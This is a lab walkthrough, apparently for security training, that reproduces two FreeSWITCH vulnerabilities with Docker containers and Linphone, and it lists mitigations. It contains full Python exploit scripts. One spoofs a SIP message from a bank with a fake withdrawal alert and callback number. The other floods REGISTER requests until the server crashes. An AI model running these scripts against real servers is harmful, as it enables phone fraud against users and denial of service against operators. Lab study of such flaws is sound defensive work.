# SIP Spoofing and DoS Attack
- Vulnerable component: FreeSWITCH server
- Affected version: ≤ 1.10.6
- CVE IDs: [CVE-2021-37624](https://nvd.nist.gov/vuln/detail/CVE-2021-37624), [CVE-2021-41145](https://nvd.nist.gov/vuln/detail/CVE-2021-41145)
## Description
In this scenario, the first attack consists of sending a SIP Message from an unregistered user impersonating another user (spoofing). In the second attack, continuous registration requests are sent to the FreeSWITCH server, causing the container to crash (DoS via SIP Flooding).

## How to reproduce the issue - SIP Spoofing
For both attacks, the Linphone application is used. For the first scenario, a user must be registered. FreeSWITCH provides default users ranging from <b>1000</b> to <b>1020</b> (it is recommended to use one of these).
The username corresponds to the chosen value, while the password is <b>1234</b>.
To complete the registration, the SIP server must be specified. The IP address of the VM hosting the containers is used:

![registration](/public/labs/1_2_sip_spoofing_dos_freeswitch/img/1001.png)

The containers are started with:
```bash
docker compose up -d --build
```

Once the <i>attacker</i> container is running, it can be accessed with:
```bash
docker exec -it attacker sh
```
and the python script can be executed:
```bash
python3 spoofing.py <IP_VM> <clientSIP>
```
where:
- `IP_VM` is the IP address of the VM (FreeSWITCH container);
- `clientSIP` is the number of the SIP client (linphone).

The script used is:
```python
import sys, socket, random, string

UDP_IP = sys.argv[1]
UDP_PORT = 5060
ext = sys.argv[2]
rand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
msg="MESSAGE sip:%s@%s SIP/2.0\r\n" % (ext, UDP_IP)
msg+="Via: SIP/2.0/UDP 192.168.2.19:10096;rport;branch=z9hG4bK-%s\r\n" % rand
msg+="Max-Forwards: 70\r\n"
msg+="From: <sip:UniCredit@%s>;tag=%s\r\n" %(UDP_IP, rand)
msg+="To: <sip:%s@%s>\r\n" %(ext, UDP_IP)
msg+="Call-ID: %s\r\n" % rand
msg+="CSeq: 1 MESSAGE\r\n"
msg+="Contact: <sip:UniCredit@192.168.2.19:10060;transport=udp>\r\n"
msg+="Content-Type: text/plain\r\n"
msg+="Content-Length: 81\r\n\r\n"
msg+="A withdrawal of €2,000 has been made.\nFor more information, call 321 757 75 11."

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
```

Because the server does not verify that the sender is registered (i.e. ```auth-messages = false``` by default), the spoofed message will be accepted — resulting in the spoofed user (e.g. ```UniCredit```) appearing to send the message.

The following message will appear:

![spoofing](/public/labs/1_2_sip_spoofing_dos_freeswitch/img/message_unicredit.png)

## Mitigations
- Upgrade to a patched version (e.g. 1.10.7 or later). 
- In configuration, set ```auth-messages = true``` so that SIP MESSAGE requests require authentication.

## How to reproduce the issue - DoS via SIP Flood
In the second scenario, from the attacker container, run:
```bash
python3 dos-sipflood.py <IP_VM>
```
The script below repeatedly sends SIP REGISTER (or similar) requests to the FreeSWITCH server:
```python
import socket, string, random, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
cseq = 1
UDP_IP = sys.argv[1]
UDP_PORT = 5060

while True:
    r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    
    msg = "REGISTER sip:%s SIP/2.0\r\n" % (UDP_IP, )
    msg += "Via: SIP/2.0/UDP %s:46786;rport;branch=z9hG4bK-%s\r\n" % (UDP_IP, r, )
    msg += "Max-Forwards: 70\r\n"
    msg += "From: <sip:98647499@%s>;tag=%s\r\n" % (UDP_IP, r, )
    msg += "To: <sip:98647499@%s>\r\n" % (UDP_IP, )
    msg += "Call-ID: %s\r\n" % (r, )
    msg += "CSeq: %s REGISTER\r\n" % (cseq, )
    msg += "Contact: <sip:98647499@%s:46786;transport=udp>\r\n" % (UDP_IP, )
    msg += "Expires: 60\r\n"
    msg += "Content-Length: 0\r\n"
    msg += "\r\n" 

    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

    cseq += 1
```
Because the server must allocate resources to process each registration, memory is exhausted and the FreeSWITCH container crashes. 

You can observe this by monitoring the container with `docker stats`: after some time memory consumption grows until it hits the limit, then the container terminates.

## Mitigation
- Update to patched version (e.g. 1.10.7 or later).

## Credits
These vulnerabilities were discovered by [Enable Security](https://www.enablesecurity.com/)